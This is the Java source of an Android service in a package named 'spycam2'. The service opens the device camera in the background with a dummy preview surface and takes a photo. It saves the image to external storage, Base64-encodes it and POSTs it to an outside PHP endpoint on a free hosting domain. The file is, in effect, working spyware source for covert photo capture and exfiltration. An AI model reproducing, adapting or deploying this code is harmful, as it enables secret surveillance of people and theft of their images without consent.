package com.yapps.spycam2;

import android.app.Service;
import android.content.Intent;
import android.hardware.Camera;
import android.os.Environment;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import android.view.SurfaceView;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.io.FileOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class CameraService extends Service {
    static int x;
String tag="mydebugs";
    String encodedImage;
    public CameraService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return  null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent,flags,startId);
        Camera camera = Camera.open();
        SurfaceView surfaceView=new SurfaceView(getApplicationContext());
        try {
            camera.setPreviewDisplay(surfaceView.getHolder());
            Camera.Parameters parameters = camera.getParameters();
            camera.setParameters(parameters);
            camera.startPreview();
            camera.takePicture(null,null,mcall);
        } catch (IOException e) {
            e.printStackTrace();
        }

        //surfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        return START_NOT_STICKY;
    }
    Camera.PictureCallback mcall=new Camera.PictureCallback() {
        @Override
        public void onPictureTaken(byte[] data, Camera camera) {
            FileOutputStream output;
            try {
                x++;
                output=new FileOutputStream(Environment.getExternalStorageDirectory()+"/image"+x+".jpg");
                output.write(data);
                output.close();
                camera.release();
                Toast.makeText(getApplicationContext(),"camera clicked",Toast.LENGTH_LONG).show();
            } catch (IOException e) {
                e.printStackTrace();
            }

            encodedImage= Base64.encodeToString(data,Base64.DEFAULT);

            StringRequest stringRequest=new StringRequest(Request.Method.POST, "http://whencutwini.coolpage.biz/UploadedImages/getimages.php", new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
      Toast.makeText(getApplicationContext(),response+"  ok",Toast.LENGTH_LONG).show();
                    Log.d(tag, response);
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
          Toast.makeText(getApplicationContext(),""+error,Toast.LENGTH_LONG).show();
                    Log.d(tag,error+"");
                }
            }){
                @Override
                protected Map<String, String> getParams() {
                    Map<String, String> params = new HashMap<String, String>();
                    params.put("img_url",encodedImage);
                    return params;
                }
            };
            Volley.newRequestQueue(getApplicationContext()).add(stringRequest);



        }
    };
}
